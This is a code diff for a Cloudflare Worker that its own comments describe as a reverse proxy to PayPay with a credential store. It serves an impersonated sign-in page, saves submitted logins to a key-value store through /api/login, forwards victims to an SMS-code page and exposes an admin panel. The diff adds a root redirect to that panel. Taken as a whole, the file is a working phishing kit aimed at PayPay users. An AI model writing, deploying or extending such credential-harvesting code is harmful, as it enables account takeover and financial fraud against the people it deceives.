@@ -1,10 +1,10 @@
 // Cloudflare Worker — reverse proxy to PayPay + credential store
 // KV binding: CREDS
+// / → /admin リダイレクト
 // /admin で管理画面
 // 16文字IDパスは既存の docs/signin.html を配信
 // /api/login で credential を KV に保存して sms.html へリダイレクト
 
-const TARGET_ORIGIN = "https://www.paypay.ne.jp";
 const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
 const ADMIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/admin.html";
 const SIGNIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/signin.html";
@@ -13,6 +13,10 @@ const SMS_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-
 export default {
   async fetch(request, env) {
     const url = new URL(request.url);
+
+    if (url.pathname === "/" || url.pathname === "") {
+      return Response.redirect(url.origin + "/admin", 302);
+    }
 
     if (url.pathname === "/admin" || url.pathname === "/admin.html") {
       return fetchStatic(ADMIN_SOURCE);
@@ -64,7 +68,7 @@ export default {
       return fetchStatic(SIGNIN_SOURCE);
     }
 
-    return new Response("Not found", { status: 404 });
+    return new Response("Not found: " + url.pathname, { status: 404 });
   },
 };
 
